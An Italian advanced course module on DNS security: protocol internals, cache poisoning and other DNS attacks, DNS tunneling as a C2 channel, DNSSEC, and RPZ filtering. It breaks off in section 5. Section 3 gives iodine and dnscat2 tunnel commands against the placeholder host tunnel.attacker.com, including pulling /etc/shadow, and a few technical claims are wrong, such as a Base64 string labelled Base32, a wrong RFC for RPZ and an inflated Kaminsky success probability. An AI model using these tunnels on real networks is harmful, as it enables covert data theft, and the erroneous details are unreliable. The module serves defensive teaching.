# DNS Security, Monitoring e Tecniche di Attacco/Difesa

> **Modulo 33** · **Tempo:** ~120 min lettura + 360 min lab · **Livello:** advanced · **Aggiornamento:** 2026-05-07
> **Prerequisiti:** Moduli 04, 05, 07; conoscenza TCP/IP stack; familiarita' con Linux CLI.
> **Obiettivi:** padroneggiare architettura DNS, superficie di attacco, DNSSEC, tecniche offensive/difensive, monitoring avanzato, hardening infrastrutturale.

---

## Indice

1. [Architettura DNS e Superficie d'Attacco](#1-architettura-dns-e-superficie-dattacco)
2. [Attacchi DNS — Offensive](#2-attacchi-dns--offensive)
3. [DNS come Canale C2](#3-dns-come-canale-c2)
4. [DNSSEC](#4-dnssec)
5. [DNS Security Solutions](#5-dns-security-solutions)
6. [Monitoraggio DNS](#6-monitoraggio-dns)
7. [DNS Infrastructure Hardening](#7-dns-infrastructure-hardening)
8. [DNS e Active Directory](#8-dns-e-active-directory)
9. [DNS Threat Intelligence](#9-dns-threat-intelligence)
10. [Laboratorio](#10-laboratorio)

---

## 1. Architettura DNS e Superficie d'Attacco

### Il protocollo DNS — analisi dettagliata

Il Domain Name System opera come database distribuito gerarchico, definito originariamente in RFC 1034/1035 e successivamente esteso da decine di RFC complementari. La comprensione profonda del protocollo e' prerequisito obbligatorio per qualsiasi attivita' di sicurezza DNS, sia offensiva che difensiva.

**Query types principali e implicazioni di sicurezza:**

| Record Type | RFC | Uso legittimo | Abuso tipico |
|---|---|---|---|
| A / AAAA | 1035 / 3596 | Risoluzione nome-IP | Fast-flux, DGA |
| CNAME | 1035 | Alias | Dangling CNAME takeover |
| MX | 1035 | Mail routing | Phishing, mail spoofing |
| TXT | 1035 | SPF, DKIM, verifica | DNS tunneling payload |
| SRV | 2782 | Service discovery | AD enumeration |
| NS | 1035 | Delegation | NS hijacking |
| SOA | 1035 | Zone authority | Zone transfer info leak |
| PTR | 1035 | Reverse lookup | Recon |
| AXFR | 5936 | Zone transfer | Zone enumeration |
| ANY | 8482 (deprecated) | All records | Amplification DDoS |
| NULL | 1035 | Experimental | C2 tunneling |

**Recursion vs Iteration:**

Il processo di risoluzione DNS coinvolge due modalita' fondamentalmente diverse. Nella risoluzione ricorsiva, il client (stub resolver) invia la query al recursive resolver, che si assume la responsabilita' completa di risolvere il nome attraversando la gerarchia DNS — root servers, TLD servers, authoritative servers — e restituisce la risposta finale al client. Il resolver agisce come proxy completo. Nella risoluzione iterativa, ogni server consultato restituisce un referral (puntamento al server successivo nella catena) e il resolver segue i referral autonomamente.

La distinzione ha implicazioni di sicurezza dirette: un recursive resolver che accetta query da qualsiasi sorgente (open resolver) diventa strumento di amplification DDoS. Il flag RD (Recursion Desired) nel DNS header, bit 8 del terzo byte, controlla il comportamento. Un authoritative server che riceve una query con RD=1 ma non offre recursion risponde con RA=0 (Recursion Available = false) nel response.

**Caching e TTL — il cuore della superficie d'attacco:**

Il caching DNS e' il meccanismo che rende il sistema scalabile: ogni risposta include un TTL (Time To Live) in secondi che indica per quanto tempo il record puo' essere riutilizzato senza ri-query. Un record con TTL 3600 viene servito dalla cache per un'ora. Il caching introduce il vettore di attacco fondamentale del DNS: se un attaccante riesce ad inserire un record falso nella cache di un resolver (cache poisoning), tutti i client serviti da quel resolver riceveranno l'IP malevolo fino alla scadenza del TTL.

TTL bassi (< 300s) sono indicatori di potenziale abuso: fast-flux networks ruotano gli IP ogni pochi secondi. TTL a 0 forzano ri-query ad ogni richiesta, potenzialmente utilizzati per DNS rebinding. TTL estremamente alti (> 86400) possono indicare tentativi di persistenza nella cache.

**EDNS0 (Extension Mechanisms for DNS — RFC 6891):**

EDNS0 estende il protocollo DNS oltre i limiti originali di 512 byte UDP. Aggiunge un pseudo-record OPT nella additional section che comunica la dimensione del buffer UDP supportata dal client (tipicamente 4096 byte) e trasporta opzioni addizionali come DNSSEC OK (DO flag), Client Subnet (ECS, RFC 7871), e cookie (RFC 7873).

Implicazioni di sicurezza di EDNS0:
- **Amplification factor:** risposte EDNS0 possono raggiungere 4096+ byte, amplificando il fattore di amplificazione DDoS da ~2-3x (512 byte) a ~50-70x
- **ECS (EDNS Client Subnet):** espone subnet del client originale al server autoritativo — privacy leak significativo; permette tracking geografico granulare degli utenti
- **Buffer size probing:** un attaccante puo' determinare la versione del software resolver dal buffer size annunciato
- **EDNS0 cookie:** meccanismo anti-spoofing introdotto per mitigare cache poisoning; il server genera un cookie legato all'IP del client, verificato nelle query successive

### Componenti dell'infrastruttura DNS

**Stub Resolver:** il componente DNS nel sistema operativo del client. Su Linux configurato via `/etc/resolv.conf` o systemd-resolved. Non effettua query ricorsive autonomamente — delega tutto al recursive resolver configurato. Superficie d'attacco: manipolazione di `/etc/resolv.conf` (privilege escalation locale), DHCP poisoning per sovrascrivere il resolver, malware che modifica la configurazione DNS.

**Recursive Resolver (Caching Resolver):** il componente critico dell'infrastruttura. Riceve query dai client, le risolve attraversando la gerarchia, memorizza in cache le risposte. Implementazioni comuni: BIND (named), Unbound, PowerDNS Recursor, Knot Resolver. Superficie d'attacco: cache poisoning, open resolver abuse per DDoS, DNS rebinding, query log harvesting per surveillance. E' il single point of failure piu' significativo per la sicurezza DNS di un'organizzazione.

**Authoritative Server:** risponde con autorita' per le zone DNS che gestisce. Non effettua recursion. Implementazioni: BIND, PowerDNS Authoritative, Knot DNS, NSD. Superficie d'attacco: zone transfer non autorizzato (AXFR leak), zone poisoning, denial of service, compromissione per modificare record legittimi.

**Forwarder:** recursive resolver che, invece di interrogare direttamente la gerarchia DNS, inoltra le query a un altro resolver upstream. Tipico in ambienti enterprise dove i client puntano al DNS interno che a sua volta forwarda a provider esterni (8.8.8.8, 1.1.1.1). Superficie d'attacco: trust chain fragile — se il forwarder upstream e' compromesso, l'intera catena lo e'. Man-in-the-middle tra forwarder e upstream resolver su link non crittografato.

**Root Hints:** lista dei 13 root server clusters (a.root-servers.net attraverso m.root-servers.net) utilizzata dai recursive resolver come punto di partenza per la risoluzione. Distribuita come file `named.root` (BIND) o `root.hints` (Unbound). Superficie d'attacco: sostituzione del file root hints per redirigere tutta la risoluzione DNS attraverso server controllati dall'attaccante — attacco devastante ma richiede accesso root al resolver.

### Mappa della superficie d'attacco

```
                    ┌──────────────┐
                    │  Root Hints  │ ← File manipulation (root access)
                    └──────┬───────┘
                           │
                    ┌──────┴───────┐
                    │ Root Servers │ ← BGP hijacking (nation-state)
                    └──────┬───────┘
                           │
                    ┌──────┴───────┐
                    │ TLD Servers  │ ← Registrar compromise
                    └──────┬───────┘
                           │
┌────────┐  query   ┌──────┴───────┐  query   ┌─────────────┐
│ Client │─────────→│  Recursive   │─────────→│ Authoritative│
│ (Stub) │←─────────│  Resolver    │←─────────│   Server     │
└────────┘ response └──────────────┘ response └─────────────┘
     ↑                     ↑                         ↑
  DHCP poison         Cache poisoning           Zone transfer
  resolv.conf         Open resolver DDoS        Record injection
  malware             DNS rebinding             Denial of Service
                      Query logging abuse       Subdomain takeover
```

---

## 2. Attacchi DNS — Offensive

### DNS Cache Poisoning

Il cache poisoning rimane il vettore di attacco piu' significativo contro l'infrastruttura DNS. L'obiettivo e' inserire un record DNS falso nella cache di un recursive resolver, causando la risoluzione di un nome legittimo verso un IP controllato dall'attaccante.

**Attacco classico pre-Kaminsky:** l'attaccante invia una risposta DNS spoofata al resolver prima che arrivi la risposta legittima dall'authoritative server. Per avere successo, la risposta spoofata deve corrispondere al TXID (Transaction ID, 16 bit) e alla porta sorgente UDP della query originale. Con TXID a 16 bit, la probabilita' di indovinare correttamente e' 1/65536 per singolo tentativo — bassa ma non trascurabile con volume sufficiente.

**Kaminsky Attack (2008):** Dan Kaminsky ha rivoluzionato il cache poisoning eliminando il vincolo temporale dell'attacco classico. Invece di attendere che il target effettui una query per il dominio bersaglio (e competere con la risposta legittima in una finestra di millisecondi), l'attaccante:

1. Forza il resolver a risolvere un sottodominio inesistente: `random12345.target.com`
2. Simultaneamente invia flood di risposte spoofate, ciascuna con un TXID diverso, che includono nella Authority Section un NS record malevolo: `target.com NS attacker-ns.evil.com`
3. Se uno dei TXID corrisponde, il resolver accetta il NS record malevolo e lo memorizza in cache
4. Da questo momento, tutte le query per `*.target.com` vengono risolte dall'authoritative server dell'attaccante

Il birthday paradox amplifica la probabilita': con N tentativi simultanei contro un TXID di 16 bit, la probabilita' di almeno un match segue la formula del compleanno. Con ~256 risposte simultanee, la probabilita' di successo per singola query forzata supera il 50%. L'attaccante puo' ripetere il ciclo con un nuovo sottodominio random immediatamente, senza dover attendere la scadenza del TTL.

**Mitigazione post-Kaminsky:** source port randomization (RFC 5452) ha aggiunto ~16 bit di entropia alla porta sorgente UDP, portando lo spazio di indovinamento da 2^16 a ~2^32. DNSSEC (sezione 4) fornisce la soluzione crittografica definitiva.

**SAD DNS (CVE-2020-25705, 2020):** i ricercatori Keyu Man, Zhiyun Qian e colleghi hanno dimostrato un side-channel attack che vanifica la source port randomization. Il kernel Linux implementa rate limiting globale per i messaggi ICMP "port unreachable" (RFC 792): quando un pacchetto UDP arriva su una porta chiusa, il kernel invia un ICMP error fino al raggiungimento del rate limit globale. L'attaccante:

1. Invia probe UDP spoofati (con source IP del resolver target) verso l'authoritative server, variando la porta di destinazione
2. Simultaneamente invia propri pacchetti UDP verso porte sicuramente chiuse del resolver, osservando se riceve ICMP errors
3. Quando i probe spoofati colpiscono la porta effettivamente usata dal resolver per quella query, il resolver NON genera ICMP error (la porta e' aperta/in uso) — il rate limit counter non decrementa
4. La differenza nel contatore ICMP rivela la porta sorgente corretta

Con la porta nota, l'attaccante deve solo indovinare il TXID (16 bit) — ritorno alla situazione pre-Kaminsky. Mitigazione: randomizzazione del rate limit ICMP nel kernel (patch Linux), utilizzo di DNS cookies (RFC 7873), DNSSEC.

### DNS Spoofing e MITM

Il DNS spoofing in senso lato comprende qualsiasi tecnica che redirige la risoluzione DNS. Oltre al cache poisoning (che opera a livello di resolver), attacchi man-in-the-middle diretti sono possibili quando l'attaccante ha visibilita' sul traffico di rete:

- **ARP poisoning + DNS intercept:** l'attaccante avvelena la tabella ARP dello switch/client per ricevere il traffico DNS e rispondre con IP malevoli
- **Rogue DHCP server:** distribuisce un DNS resolver controllato dall'attaccante ai client della rete
- **BGP hijacking:** redirige il traffico verso i resolver pubblici (es. 8.8.8.8) attraverso un AS controllato dall'attaccante — livello nation-state
- **DNS changer malware:** modifica `/etc/resolv.conf` o le impostazioni DNS del sistema operativo

### DNS Amplification DDoS

Gli open resolver (recursive resolver che accettano query da qualsiasi IP) sono armi DDoS formidabili. L'attaccante invia query DNS con source IP spoofato (l'IP della vittima) verso migliaia di open resolver. Ogni query di ~60 byte genera una risposta di ~3000-4000 byte (usando record ANY o query specifiche con EDNS0), creando un fattore di amplificazione fino a ~70x.

**Anatomy dell'attacco:**

```
Attacker (src IP spoofed = Victim IP)
    │
    ├──→ Open Resolver 1 ──→ Response 4KB ──→ Victim
    ├──→ Open Resolver 2 ──→ Response 4KB ──→ Victim
    ├──→ Open Resolver 3 ──→ Response 4KB ──→ Victim
    └──→ ... (thousands)  ──→ ...          ──→ Victim
                                              (overwhelmed)
```

Query tipica per massimizzare l'amplificazione: `ANY isc.org` o `ANY dnsamplificationtest.com` — domini con molti record che generano risposte massive.

**Mitigazione:** chiusura degli open resolver (Response Rate Limiting — RRL), BCP38/BCP84 per prevenire IP spoofing a livello di rete, limitazione delle risposte ANY (RFC 8482).

### DNS Rebinding

Il DNS rebinding bypassa la Same-Origin Policy (SOP) del browser sfruttando il meccanismo DNS stesso. L'attaccante controlla un dominio (`evil.com`) con TTL molto basso (1-2 secondi):

1. La vittima visita `evil.com` — il browser risolve l'IP all'indirizzo del server dell'attaccante
2. Il JavaScript dell'attaccante viene caricato ed eseguito nel contesto `evil.com`
3. Il TTL scade. Il JavaScript effettua una nuova richiesta a `evil.com`
4. Il DNS dell'attaccante ora risponde con un IP interno della rete della vittima (es. `192.168.1.1`)
5. Il browser considera la richiesta same-origin (stesso dominio `evil.com`) e la esegue
6. Il JavaScript dell'attaccante puo' ora interagire con dispositivi della rete interna della vittima

**Target comuni:** router web interface, stampanti, telecamere IP, servizi interni non autenticati, metadata service cloud (169.254.169.254).

**Mitigazione:** DNS rebinding protection nei resolver (blocco risposte con IP privati per query esterne), header `Host` validation nei web server, autenticazione su tutti i servizi interni.

### NXDOMAIN Attack

Flood di query per domini inesistenti. L'obiettivo e' saturare il resolver con query che richiedono la traversata completa della gerarchia DNS (nessun cache hit possibile per domini inesistenti). Ogni query genera traffico verso root, TLD e authoritative server, consumando risorse del resolver e della rete.

### Phantom Domain Attack

L'attaccante registra domini "fantasma" i cui authoritative server sono configurati per rispondere estremamente lentamente o non rispondere affatto. Quando il resolver target riceve query per questi domini, i thread/worker del resolver rimangono bloccati in attesa di risposta, consumando risorse (file descriptor, memoria, slot di query pendenti) fino all'esaurimento. A differenza del NXDOMAIN attack, il phantom domain attack non genera volume elevato di traffico — il danno deriva dall'esaurimento delle risorse di stato del resolver.

### Water Torture Attack (Random Subdomain Flood)

Attacco sofisticato che combina elementi di NXDOMAIN e amplification. L'attaccante genera query per sottodomini casuali di un dominio target legittimo: `a7f3b.target.com`, `x9k2m.target.com`, ecc. Ogni query non puo' essere servita dalla cache (sottodominio unico) e deve raggiungere l'authoritative server di `target.com`. L'effetto e' duplice:

1. Il resolver consuma risorse per risoluzioni inevitabilmente fallimentari (NXDOMAIN)
2. L'authoritative server di `target.com` viene sommerso di query, potenzialmente causando DoS per l'intero dominio

La difesa e' complessa: il resolver non puo' distinguere facilmente query legittime da quelle dell'attacco senza analisi statistica (entropia dei nomi, volume per dominio parent, distribuzione temporale).

---

## 3. DNS come Canale C2

### Teoria del DNS Tunneling

Il DNS tunneling sfrutta il protocollo DNS come canale di comunicazione bidirezionale, bypassando firewall e proxy che tipicamente permettono il traffico DNS in uscita. Il principio fondamentale e' semplice: i dati vengono codificati nelle query DNS (tipicamente nel subdomain label) e nelle risposte (nei record TXT, CNAME, NULL, MX).

**Encoding dei dati nelle query:**

Il label di un sottodominio puo' contenere fino a 63 caratteri, e il nome completo fino a 253 caratteri. Utilizzando encoding Base32 (compatibile con i caratteri DNS consentiti: alfanumerici e trattino), un singolo nome DNS puo' trasportare circa 150 byte di payload.

```
Query:  SGVsbG8gV29ybGQ.tunnel.attacker.com  (payload: "Hello World")
         ↑ Base32-encoded data
```

**Encoding dei dati nelle risposte:**

I record TXT possono contenere fino a 255 caratteri per stringa, con piu' stringhe concatenabili (fino al limite EDNS0 di 4096 byte). I record CNAME, MX, e NULL offrono canali alternativi con diverse capacita' di payload.

**Bandwidth stimate:**

| Metodo | Upstream (query) | Downstream (response) |
|---|---|---|
| Subdomain label Base32 | ~150 bytes/query | — |
| TXT record response | — | ~200 bytes/response |
| NULL record | — | ~500 bytes/response |
| CNAME chaining | ~60 bytes/query | ~60 bytes/response |
| Throughput tipico | 5-50 KB/s | 10-100 KB/s |

La bandwidth e' bassa ma sufficiente per C2 commands, credential exfiltration, e download di stage successivi.

### Tool di DNS Tunneling

**iodine:** tunnel IP-over-DNS maturo e stabile. Crea un'interfaccia di rete virtuale (tun) che incapsula traffico IP in query/risposte DNS. Supporta diversi encoding (Base32, Base64, Base128) e record types (NULL, TXT, CNAME, MX). Server-side richiede un authoritative NS per un dominio controllato.

```bash
# Server (attaccante) — richiede NS delegation per tunnel.attacker.com
iodined -f -c -P secretpassword 10.0.0.1 tunnel.attacker.com

# Client (vittima/implant)
iodine -f -P secretpassword tunnel.attacker.com

# Post-tunnel: SSH attraverso il tunnel
ssh user@10.0.0.1  # traffico SSH incapsulato in DNS
```

**dnscat2:** tool C2 purpose-built per DNS tunneling. A differenza di iodine (che tunnelizza IP generico), dnscat2 fornisce un framework C2 completo con command shell, file transfer, port forwarding, e session management. Supporta crittografia (Salsa20/Poly1305) end-to-end nel tunnel.

```bash
# Server C2
ruby dnscat2.rb tunnel.attacker.com --secret=s3cr3t

# Client (implant)
./dnscat --dns=domain:tunnel.attacker.com --secret=s3cr3t

# Comandi C2 disponibili
dnscat2> session -i 1
command (session1)> shell
command (session1)> download /etc/shadow
command (session1)> upload implant2.sh
```

**DNSExfiltrator:** tool specializzato per data exfiltration. Frammenta file in chunk, li codifica in query DNS, e li riassembla lato server. Supporta compressione e chunking automatico.

**Cobalt Strike DNS Beacon:** il beacon DNS di Cobalt Strike utilizza query A e TXT per la comunicazione C2. Il beacon invia periodicamente query DNS al team server, che risponde con comandi codificati nei record. Il jitter configurabile rende il traffico meno distinguibile dal DNS legittimo. La configurazione del Malleable C2 Profile permette di customizzare i pattern DNS.

### DNS over HTTPS (DoH) per C2 Evasion

L'adozione crescente di DoH (RFC 8484) apre un vettore di evasione significativo per il C2 DNS. Il traffico DNS incapsulato in HTTPS (porta 443) e' indistinguibile dal normale traffico web per firewall e IDS senza ispezione TLS completa. Un implant che utilizza DoH verso un resolver pubblico (es. `https://dns.google/dns-query`) bypassa completamente:

- Firewall che bloccano porta 53 in uscita
- DNS sinkhole aziendali
- Monitoring DNS basato su query logging al resolver interno
- DPI (Deep Packet Inspection) senza TLS interception

**Detection challenge:** l'unica visibilita' rimasta e' l'ispezione TLS (MITM proxy), che ha implicazioni di privacy e compliance significative, o il blocco totale dei resolver DoH pubblici (lista in continua evoluzione). L'analisi del traffico HTTPS per pattern (timing, dimensione pacchetti, frequenza) puo' identificare utilizzo anomalo di DoH ma con alti tassi di falsi positivi.

### Data Exfiltration via DNS

Tecniche per estrarre dati sensibili attraverso il canale DNS:

1. **Subdomain encoding:** dati frammentati e codificati come sottodomini: `chunk1.chunk2.exfil.attacker.com`
2. **TXT record query con payload nel nome:** il nome della query contiene i dati, la risposta e' irrilevante (anche NXDOMAIN funziona — il dato e' gia' transitato attraverso la rete)
3. **Slow drip exfiltration:** una query ogni N minuti, mimetizzata nel traffico DNS normale. Estremamente difficile da rilevare, bandwidth ~100 bytes/minuto sufficiente per credenziali e chiavi
4. **Steganografia DNS:** dati nascosti in campi apparentemente legittimi (TTL values, padding bytes, case variations — 0x20 encoding)

### DNS Fast-Flux per Infrastruttura Botnet

Il fast-flux associa un singolo nome DNS a centinaia di IP diversi, ruotati ogni pochi secondi (TTL 30-120s). I bot della rete agiscono come proxy, inoltrando il traffico al server C2 reale (mothership). Double-flux estende il concetto ruotando anche gli NS record, rendendo la takedown dell'infrastruttura estremamente difficile.

**Indicatori di fast-flux:**
- TTL < 300 secondi
- Diversi IP in risposte successive per lo stesso nome
- IP distribuiti in ASN diversi e paesi diversi
- Reverse DNS inesistente o generico per gli IP associati
- Alto rapporto di IP unici rispetto al numero di query

---

## 4. DNSSEC

### Catena crittografica di trust

DNSSEC (DNS Security Extensions, RFC 4033/4034/4035) aggiunge autenticazione crittografica alle risposte DNS, garantendo integrita' e autenticita' (non confidenzialita' — le risposte rimangono in chiaro). La catena di trust parte dalla root zone e si propaga per delegation attraverso l'intera gerarchia DNS.

**Componenti crittografiche:**

**ZSK (Zone Signing Key):** coppia di chiavi RSA/ECDSA utilizzata per firmare i record della zona. La chiave privata firma ogni RRset (insieme di record con stesso nome e tipo) producendo un record RRSIG. La chiave pubblica e' pubblicata come record DNSKEY nella zona. Il ZSK viene ruotato frequentemente (tipicamente ogni 1-3 mesi) perche' firma un volume elevato di dati.

**KSK (Key Signing Key):** coppia di chiavi piu' robusta utilizzata esclusivamente per firmare il DNSKEY RRset della zona (che contiene sia il KSK pubblico che il ZSK pubblico). Il KSK e' il trust anchor della zona — la sua validita' e' attestata dal record DS nella zona parent. Il KSK viene ruotato raramente (ogni 1-2 anni) perche' il rollover richiede coordinamento con la zona parent.

**DS (Delegation Signer):** record nella zona parent che contiene l'hash della KSK pubblica della zona figlio. E' il collegamento crittografico tra livelli della gerarchia: la zona parent garantisce l'identita' della KSK della zona figlio attraverso il DS record, firmato con il ZSK della zona parent.

**RRSIG (Resource Record Signature):** firma crittografica di un RRset. Contiene: tipo del record firmato, algoritmo, TTL originale, scadenza della firma, inception time, key tag del ZSK usato per la firma, nome del firmatario, e la firma stessa. Ogni RRset nella zona ha un RRSIG corrispondente.

**NSEC / NSEC3:** record di denial of existence autenticata. Quando un nome non esiste nella zona, il server non puo' semplicemente rispondere NXDOMAIN — una risposta negativa non firmata sarebbe vulnerabile a spoofing. NSEC/NSEC3 forniscono prova crittografica che il nome richiesto non esiste.

### Processo di validazione — step by step

```
Client query: www.example.com A
                                    
1. Resolver ha la root trust anchor (KSK della root zone)
   ↓
2. Query root per .com NS
   Root risponde: .com NS + DS record per .com + RRSIG
   Resolver verifica RRSIG del DS con il ZSK della root
   ↓
3. Query .com TLD per example.com NS  
   .com risponde: example.com NS + DS record per example.com + RRSIG
   Resolver verifica RRSIG del DS con il ZSK di .com
   (ZSK di .com validato tramite KSK di .com, validata dal DS nella root)
   ↓
4. Query example.com authoritative per www.example.com A
   Risponde: www.example.com A 93.184.216.34 + RRSIG
   Resolver verifica RRSIG con il ZSK di example.com
   (ZSK di example.com validato tramite KSK di example.com,
    validata dal DS in .com)
   ↓
5. Catena di trust completa: root → .com → example.com → record
   Risposta validata ✓ → AD (Authenticated Data) flag settato
```

Se qualsiasi anello della catena fallisce la verifica (firma invalida, DS mancante, chiave scaduta), il resolver DNSSEC-validating restituisce SERVFAIL — preferendo il denial of service alla distribuzione di dati potenzialmente falsificati.

### Deployment DNSSEC — firma delle zone

**Generazione chiavi:**

```bash
# Generare KSK (algoritmo ECDSAP256SHA256, raccomandato)
dnssec-keygen -a ECDSAP256SHA256 -f KSK example.com
# Output: Kexample.com.+013+12345.key / .private

# Generare ZSK
dnssec-keygen -a ECDSAP256SHA256 example.com
# Output: Kexample.com.+013+67890.key / .private
```

**Firma della zona:**

```bash
# Firmare la zona con entrambe le chiavi
dnssec-signzone -A -3 $(head -c 16 /dev/urandom | od -A n -t x1 | tr -d ' ') \
    -N INCREMENT -o example.com -t db.example.com

# Output: db.example.com.signed
```

**Pubblicazione DS nel parent:** il record DS della KSK deve essere registrato presso il registrar del dominio, che lo pubblica nella zona TLD. Questo passaggio completa la catena di trust.

### Key Rollover

**ZSK Rollover (pre-publish method):**

1. Generare nuovo ZSK
2. Pubblicare il nuovo DNSKEY nella zona (pre-publish) — la zona contiene temporaneamente entrambi i ZSK pubblici
3. Attendere la propagazione (2x TTL del DNSKEY RRset)
4. Ri-firmare la zona con il nuovo ZSK
5. Rimuovere il vecchio ZSK dal DNSKEY RRset dopo la scadenza delle vecchie firme

**KSK Rollover (double-DS method):**

1. Generare nuovo KSK
2. Aggiungere il DS del nuovo KSK nella zona parent (coesistenza di vecchio e nuovo DS)
3. Attendere la propagazione
4. Firmare il DNSKEY RRset con il nuovo KSK
5. Rimuovere il vecchio DS dalla zona parent

Il KSK rollover e' l'operazione piu' delicata in DNSSEC: un errore nel timing puo' rompere la catena di trust e rendere l'intera zona irrisolvibile per i resolver validanti.

### NSEC Walking — Zone Enumeration

NSEC fornisce denial of existence elencando il nome successivo nella zona in ordine canonico. Un attaccante puo' camminare l'intera zona seguendo la catena NSEC:

```
Query: nonexistent1.example.com
Response: NSEC alpha.example.com → beta.example.com
  (prova che non esiste nulla tra alpha e beta)

Query: beta1.example.com
Response: NSEC beta.example.com → gamma.example.com

Query: gamma1.example.com
Response: NSEC gamma.example.com → example.com (wrap-around)
```

Risultato: enumerazione completa della zona — `alpha`, `beta`, `gamma` — senza autorizzazione a zone transfer.

**NSEC3 (RFC 5155):** mitiga l'NSEC walking usando hash dei nomi al posto dei nomi in chiaro. I record NSEC3 contengono gli hash SHA-1 dei nomi in ordine, con salt e iterations configurabili. Tuttavia, con salt e iterations noti (sono pubblicati nel record NSEC3PARAM), l'attaccante puo' effettuare offline dictionary attack per enumerare i nomi. NSEC3 e' mitigazione, non soluzione: rallenta l'enumerazione ma non la previene contro un attaccante determinato con risorse computazionali adeguate.

### Sfide operative DNSSEC

**Clock skew:** le firme RRSIG hanno inception e expiration timestamp. Se l'orologio del resolver e' fuori sincronizzazione (> ~5 minuti tipicamente), le firme valide vengono rifiutate. NTP affidabile e' prerequisito critico per DNSSEC.

**Key ceremony:** per zone critiche (TLD, root), la generazione e gestione delle chiavi segue cerimonie formali con HSM (Hardware Security Module), audit trail video, e multi-party control. La root KSK ceremony avviene fisicamente in due facility ICANN (El Segundo, CA e Culpeper, VA) con Trusted Community Representatives.

**Emergency rollover:** se una chiave privata viene compromessa, il rollover deve avvenire immediatamente. Per il ZSK, il pre-publish method richiede comunque la propagazione — nel frattempo la zona e' vulnerabile. Per il KSK, il coordinamento con la zona parent sotto pressione temporale e' la sfida maggiore. Piani di emergency rollover devono essere documentati, testati, e accessibili offline.

---

## 5. DNS Security Solutions

### DNS Filtering

Il filtering DNS blocca l'accesso a domini malevoli, phishing, malware C2, e contenuti indesiderati intercettando le query DNS a livello di resolver.

**Pi-hole:** soluzione self-hosted basata su dnsmasq/FTLDNS che agisce come DNS sinkhole. Blocca domini da blocklist configurabili (default: ~100k domini). Fornisce dashboard web con statistiche dettagliate sulle query. Deployment tipico: Raspberry Pi o container Docker nella rete locale. Limitazione: protezione solo per i client che utilizzano Pi-hole come resolver — bypassabile con DoH diretto.

**AdGuard Home:** alternativa a Pi-hole con supporto nativo DoH/DoT sia in ingresso (client) che in uscita (upstream resolver). Include rewrite rules, DNS filtering personalizzabile, e client-level configuration. Supporta DNSSEC validation.

**NextDNS:** servizio cloud di DNS filtering con configurazione per-device. Offre analytics dettagliati, blocklist curate, e protection da tracker/malware. Il vantaggio rispetto a soluzioni self-hosted e' la maintenance zero e l'aggiornamento continuo delle threat intelligence list.

**Cloudflare Gateway / Cisco Umbrella (OpenDNS):** soluzioni enterprise di Secure Web Gateway basate su DNS. Cloudflare Gateway integra DNS filtering con HTTP inspection e Zero Trust Network Access. Cisco Umbrella (ex-OpenDNS) offre DNS-layer security con integrazione nel Cisco SecureX ecosystem, threat intelligence proprietaria, e enforcement granulare per policy.

### DNS Firewall / RPZ (Response Policy Zones)

RPZ (RFC 7323, draft) permette al resolver di modificare le risposte DNS in base a policy configurabili. Il resolver mantiene una o piu' zone RPZ che contengono regole di override: quando una query corrisponde a una regola RPZ, la risposta viene sostituita secondo la policy configurata.

**Azioni RPZ disponibili:**

| Policy | Effetto |
|---|---|
| NXDOMAIN | Il dominio "non esiste" |
| NODATA | Il dominio esiste ma senza record del tipo richiesto |
| PASSTHRU | Eccezione — risolvere normalmente |
| DROP | Non rispondere (silenzioso) |
| Local Data | Rispondere con dati custom (es. redirect a warning page) |
| TCP-Only | Forzare retry su TCP |

**Esempio di RPZ zone file:**

```dns
$TTL 300
@  IN  SOA  localhost. admin.localhost. (
       2026050701   ; serial
       3600         ; refresh
       900          ; retry
       604800       ; expire
       300 )        ; minimum TTL

; Block known malware domains
malware-c2.evil.com         CNAME  .     ; NXDOMAIN
*.malware-c2.evil.com       CNAME  .     ; Block all subdomains

; Block phishing
phishing-bank.example.com   CNAME  .

; Redirect to warning page
blocked-site.com            A      10.0.0.100
blocked-site.com            AAAA   ::1

; Passthrough exception for legitimate subdomain
legit.malware-c2.evil.com   CNAME  rpz-passthru.

; Block by IP — responses containing this IP get blocked
32.198.51.100.rpz-ip        CNAME  .

; Block by nameserver
ns1.evil-provider.com.rpz-nsdname  CNAME  .
```

### DoH / DoT — Privacy vs Visibility Tradeoff

**DNS over TLS (DoT, RFC 7858):** crittografa le query DNS con TLS sulla porta 853/tcp. Vantaggi: protegge la privacy delle query DNS da intercettazione sulla rete. Il traffico e' identificabile come DNS crittografato (porta dedicata), permettendo ai firewall di applicare policy specifiche (blocco o permissione esplicita).

**DNS over HTTPS (DoH, RFC 8484):** incapsula le query DNS in HTTPS sulla porta 443/tcp. Il traffico e' indistinguibile dal normale HTTPS, rendendo impossibile per i firewall tradizionali identificare e filtrare selettivamente il traffico DNS.

**Il tradeoff fondamentale:**

| Aspetto | DNS tradizionale | DoT | DoH |
|---|---|---|---|
| Privacy on wire | Nessuna | Alta | Alta |
| Visibilita' enterprise | Completa | Parziale (porta 853 identificabile) | Nessuna |
| DNS filtering/sinkhole | Funziona | Funziona se intercettato | Non funziona |
| Blocco firewall | Porta 53 | Porta 853 | Impossibile senza TLS inspection |
| Evasione censura | Impossibile | Possibile ma rilevabile | Eccellente |

Per ambienti enterprise: la raccomandazione e' implementare DoT/DoH verso resolver interni controllati, bloccando DoH verso resolver esterni. Questo preserva la privacy del trasporto mantenendo la visibilita' operativa.

**Encrypted Client Hello (ECH, draft-ietf-tls-esni):** estensione TLS che crittografa l'SNI (Server Name Indication) nel ClientHello. Combinato con DoH, rende completamente opaco sia il nome del sito visitato (via ECH) che la risoluzione DNS (via DoH). L'impatto sulla visibilita' enterprise e' significativo: l'unica informazione rimanente e' l'IP di destinazione, facilmente mascherabile con CDN condivise.

### DNS Sinkholing

Il sinkholing reindirizza le query per domini malevoli verso un IP controllato (il sinkhole server) invece di permettere la risoluzione verso il C2 reale. Il sinkhole server puo':

- Loggare tutti i client che tentano di raggiungere il dominio malevolo (identification delle macchine infette)
- Servire una pagina di warning
- Catturare informazioni sull'implant (User-Agent, payload, callback pattern)

Implementazione tipica: RPZ che redirige i domini malevoli all'IP del sinkhole server interno, combinato con threat intelligence feed che aggiornano automaticamente la lista dei domini.

### Threat Intelligence Feed per DNS

**DGA Detection:** Domain Generation Algorithm produce domini pseudo-casuali utilizzati dal malware per contattare il C2. I domini DGA hanno caratteristiche statistiche riconoscibili: alta entropia, assenza di parole del dizionario, distribuzione uniforme dei caratteri. I feed di threat intelligence includono pattern DGA noti e modelli di machine learning per la detection real-time.

